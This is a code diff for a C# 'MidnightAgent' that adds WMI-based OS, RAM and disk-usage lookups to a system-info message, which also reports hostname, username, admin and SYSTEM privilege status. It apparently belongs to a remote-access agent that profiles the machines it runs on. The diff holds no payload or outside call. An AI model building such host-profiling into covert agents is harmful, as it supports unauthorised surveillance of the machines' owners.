@@ -38,7 +38,75 @@ namespace MidnightAgent.Core
 
         public static string Hostname => Environment.MachineName;
         public static string Username => Environment.UserName;
-        public static string OS => Environment.OSVersion.ToString();
+        public static string OS
+        {
+            get
+            {
+                try
+                {
+                    using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
+                    {
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            return obj["Caption"]?.ToString() ?? Environment.OSVersion.ToString();
+                        }
+                    }
+                }
+                catch { }
+                return Environment.OSVersion.ToString();
+            }
+        }
+
+        public static string RAM
+        {
+            get
+            {
+                try
+                {
+                    using (var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
+                    {
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            double totalMemory = Convert.ToDouble(obj["TotalPhysicalMemory"]);
+                            return $"{Math.Round(totalMemory / (1024 * 1024 * 1024), 1)} GB";
+                        }
+                    }
+                }
+                catch { }
+                return "Unknown";
+            }
+        }
+
+        public static string HDD
+        {
+            get
+            {
+                try
+                {
+                    var driveInfo = new System.Collections.Generic.List<string>();
+                    foreach (var drive in System.IO.DriveInfo.GetDrives())
+                    {
+                        if (drive.IsReady && drive.DriveType == System.IO.DriveType.Fixed)
+                        {
+                            long totalSize = drive.TotalSize;
+                            long freeSpace = drive.AvailableFreeSpace;
+                            long usedSpace = totalSize - freeSpace;
+                            double usedPercent = (double)usedSpace / totalSize * 100;
+                            
+                            string sizeStr = totalSize > 1024L * 1024 * 1024 * 1024 
+                                ? $"{Math.Round(totalSize / (1024.0 * 1024 * 1024 * 1024), 1)} TB"
+                                : $"{Math.Round(totalSize / (1024.0 * 1024 * 1024), 1)} GB";
+
+                            driveInfo.Add($"{drive.Name} ({sizeStr}) {Math.Round(usedPercent, 0)}% Used");
+                        }
+                    }
+                    return string.Join("\n     ", driveInfo);
+                }
+                catch { }
+                return "Unknown";
+            }
+        }
+
         public static string Bits => Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
         public static string Version => Config.FullVersion;
         
@@ -82,9 +150,6 @@ namespace MidnightAgent.Core
         /// <summary>
         /// Get full system info message
         /// </summary>
-        /// <summary>
-        /// Get full system info message
-        /// </summary>
         public static string GetFullInfo()
         {
             string nick = GetNickname();
@@ -98,6 +163,8 @@ namespace MidnightAgent.Core
 💻 OS: {OS}
 📊 Bits: {Bits}
 🔧 CPU: {CPU}
+🧠 RAM: {RAM}
+💾 HDD: {HDD}
 🔐 Admin: {(IsAdmin ? "Yes ✅" : "No ❌")}
 ⚡ SYSTEM: {(IsSystem ? "Yes ✅" : "No ❌")}
 📦 Version: {Version}";
